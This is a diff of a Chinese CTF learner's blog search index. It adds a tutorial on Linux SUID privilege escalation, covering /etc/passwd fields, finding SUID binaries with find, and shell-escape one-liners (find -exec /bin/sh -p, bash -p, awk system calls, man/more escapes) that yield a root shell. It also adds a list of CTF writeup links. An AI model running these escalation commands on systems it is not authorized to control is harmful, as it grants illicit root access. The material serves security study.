+<p><code>/etc/passwd</code> 文件中，每一行表示一个用户的信息，包含7个字段，用冒号（<code>:</code>）分隔。具体字段含义如下：</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>字段名</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1</strong></td>
+<td>用户名（login name）</td>
+<td>用户的登录名，用于标识用户，必须是唯一的，如<code>root</code>、<code>user1</code>等。</td>
+</tr>
+<tr>
+<td><strong>2</strong></td>
+<td>密码占位符</td>
+<td>传统上存储加密密码，但现在存储的是占位符<code>x</code>，实际密码存储在<code>/etc/shadow</code>中。</td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td>用户ID（UID）</td>
+<td>每个用户都有一个唯一的用户ID，用于标识用户。例如<code>0</code>表示超级用户<code>root</code>，普通用户的UID一般从1000开始。</td>
+</tr>
+<tr>
+<td><strong>4</strong></td>
+<td>组ID（GID）</td>
+<td>用户所属组的ID，用于标识用户的主组。主组的详细信息存储在<code>/etc/group</code>中。</td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td>备注信息</td>
+<td>说明或备注字段，通常存放用户的全名或其他信息，可以为空。</td>
+</tr>
+<tr>
+<td><strong>6</strong></td>
+<td>用户主目录</td>
+<td>用户的默认主目录，通常是<code>/home/用户名</code>，也可以指定其他目录。</td>
+</tr>
+<tr>
+<td><strong>7</strong></td>
+<td>登录Shell</td>
+<td>用户登录时的默认Shell。例如<code>/bin/bash</code>（可登录），或<code>/sbin/nologin</code>（不允许登录）。</td>
+</tr>
+</tbody>
+</table>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241127210337810.png"
+                        alt="image-20241127210337810"
+                 ></p>
+</li>
+<li>
+<p><strong><code>/etc/shadow</code></strong>：</p>
+<ul>
+<li>专门存储用户的密码信息（加密后的密码）。</li>
+<li>只有root用户或具有足够权限的用户可以访问这个文件。</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/group</code></strong>：</p>
+<ul>
+<li>存储系统中所有组的信息，例如组名、组ID（GID）以及组内的成员。</li>
+</ul>
+</li>
+</ul>
+<h3 id="利用SUID提权的原理">利用SUID提权的原理</h3>
+<p>如果一个文件的属主是 <strong>root</strong> 且设置了 <strong>SUID</strong>，即使是普通用户执行该文件，程序运行时也会以 <strong>root</strong> 权限执行；系统中的用户如果 <strong>UID=0</strong>，将被视为 <strong>root</strong> 用户。因此，若普通用户的 UID 被设为 0，登录后将自动拥有 <strong>root</strong> 权限。利用此特性，就可通过SUID进行提权。</p>
+<h3 id="如何设置SUID">如何设置SUID</h3>
+<h3 id="设置-SUID-权限">设置 SUID 权限</h3>
+<ul>
+<li>
+<p><strong>查看文件当前权限：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l filename</span><br></pre></td></tr></table></figure>
+<p>输出的权限中，没有 <code>s</code> 则表示尚未设置 SUID。</p>
+</li>
+<li>
+<p><strong>设置 SUID：</strong> 使用 <code>chmod</code> 命令给文件设置 SUID 位：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>u+s</code> 表示给文件所有者（user）增加 SUID 权限。</li>
+</ul>
+</li>
+<li>
+<p><strong>确认设置结果：</strong> 再次查看文件权限：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al filename</span><br></pre></td></tr></table></figure>
+<p>如果文件权限中显示类似 <code>-rwsr-xr-x</code>（注意 <code>s</code>），说明 SUID 设置成功。</p>
+</li>
+</ul>
+<h3 id="如何查找已有SUID的文件">如何查找已有SUID的文件</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#find / -perm -u=s -type f 2&gt;/dev/null</span></span><br><span class="line"><span class="comment">#/表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment">#-perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment">#-u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment">#-4000：查找 SUID 文件（权限位的 SUID 为 4）</span></span><br><span class="line"><span class="comment">#-type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment">#f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment">#2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br><span class="line"><span class="comment">#&gt;表示重定向</span></span><br><span class="line"><span class="comment">#/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span></span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241127212535096.png"
+                        alt="image-20241127212535096"
+                 ></p>
+<h3 id="进行SUID提权">进行SUID提权</h3>
+<p>前提：所使用的命令必须有SUID权限</p>
+<h4 id="find命令提权">find命令提权</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span></span><br><span class="line"></span><br><span class="line">find 任意文件 -<span class="built_in">exec</span> <span class="built_in">whoami</span> \; -quit</span><br><span class="line"><span class="comment">#root</span></span><br><span class="line">find 任意文件 -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line"><span class="comment">#root</span></span><br><span class="line"><span class="built_in">touch</span> 1.txt <span class="comment">#创建1.txt</span></span><br><span class="line">/usr/bin/find 1.txt -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
+<h4 id="其他命令提权">其他命令提权</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">suid文件</th>
+<th style="text-align:left">提权命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">/usr/bin/bash</td>
+<td style="text-align:left">bash -p</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/csh</td>
+<td style="text-align:left">csh -b</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/sh</td>
+<td style="text-align:left">sh -p</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/ksh</td>
+<td style="text-align:left">ksh -p</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/zsh</td>
+<td style="text-align:left">zsh</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/find</td>
+<td style="text-align:left">find /etc/passwd -exec /bin/bash -p ;</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/awk</td>
+<td style="text-align:left">awk ‘BEGIN {system(“/bin/bash”)}’</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/man</td>
+<td style="text-align:left">!/bin/bash</td>
+</tr>
+<tr>
+<td style="text-align:left">/usr/bin/more</td>
+<td style="text-align:left">!/bin/bash</td>
+</tr>
+</tbody>
+</table>
+<p>可以查阅：<a class="link"   href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fas fa-external-link-alt"></i></a></p>
+<p>离线版：<a class="link"   href="https://github.com/nccgroup/GTFOBLookup" >https://github.com/nccgroup/GTFOBLookup<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gtfoblookup gtfobins search find</span><br><span class="line"><span class="comment">#在gtfobins库中查找find命令</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 楚彗杯 超级WriteUp</title>
+    <url>//post/sbchb666/</url>
+    <content><![CDATA[<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#CRYPTO-ddd" >2024 天山固网杯决赛 部分WP - m0h31h31<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" >2024第二届福建省数据安全大赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#REVERSE-bouquet" >天山固网<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132964576" >2023黑龙江省赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132138412" >CTF Crypto — 七八月份比赛杂题记录_ctf替换了部分模型权重-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://dexterjie.github.io/2023/09/17/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81%E8%B5%9B/#%E5%86%B3%E8%B5%9B" >黑龙江省赛 | DexterJie’Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/qq_42880719/article/details/126175056" >蓝帽杯2022年半决赛 writeup(附取证题目+解压密码+附件)_2022蓝帽杯半决赛-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://hwlanxiaojun.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/#0x-04-awdshell" >安恒杯四月月赛题解<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="http://www.andynoel.xyz/?p=416" >2022 BluehatCup Semi-Finals | Partly Writeup – AndyNoel’s Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://c-lby.top/2024/2024YLCTF-1/" >『YLCTF 源鲁杯 2024』 PWN-1 WP | C_LBY’s BLOG<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" >2024年福建省大学生数据安全大赛-技能实践赛决赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.lo-ve.cn/index.php/archives/65/" >2024第二届福建省数据安全大赛-浅兮<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+  </entry>
+  <entry>
     <title>2024羊城杯 Misc方向部分WP</title>
     <url>//post/ycb2024wp/</url>
     <content><![CDATA[<h3 id="hiden">hiden</h3>
@@ -4526,29 +4526,9 @@ or summary contain a given string such as “spam”, type “modules spam”.</
       </tags>
   </entry>
   <entry>
-    <title>categories</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>abouts</title>
     <url>/about/index.html</url>
     <content><![CDATA[<p>一个菜鸡CTFer，以前是学Misc的，现在学烧烤…</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>tags</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>友情链接</title>
-    <url>/links/index.html</url>
-    <content><![CDATA[<h3 id="我的友链信息">我的友链信息</h3>
-<p>name: C3ngH</p>
-<p>avatar: <a class="link"   href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" >https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg<i class="fas fa-external-link-alt"></i></a></p>
-<p>link: <a href="https://c3ngh.top/">https://c3ngh.top/</a></p>
-<p>description: 广告位招租</p>
 ]]></content>
   </entry>
   <entry>
@@ -4857,6 +4837,26 @@ or summary contain a given string such as “spam”, type “modules spam”.</
                  ></p>
 <h3 id="写在最后">写在最后</h3>
 <p>欲买桂花同载酒，终不似，少年游。如果有什么喜欢的东西，在能力范围内的一定要买给自己！就算是很久很久以后在二手市场看到自己曾经喜欢过的物品也值得购买，因为那些也是曾经一个少年的梦想。对自己好点。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>categories</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>tags</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>友情链接</title>
+    <url>/links/index.html</url>
+    <content><![CDATA[<h3 id="我的友链信息">我的友链信息</h3>
+<p>name: C3ngH</p>
+<p>avatar: <a class="link"   href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" >https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg<i class="fas fa-external-link-alt"></i></a></p>
+<p>link: <a href="https://c3ngh.top/">https://c3ngh.top/</a></p>
+<p>description: 广告位招租</p>
 ]]></content>
   </entry>
 </search>
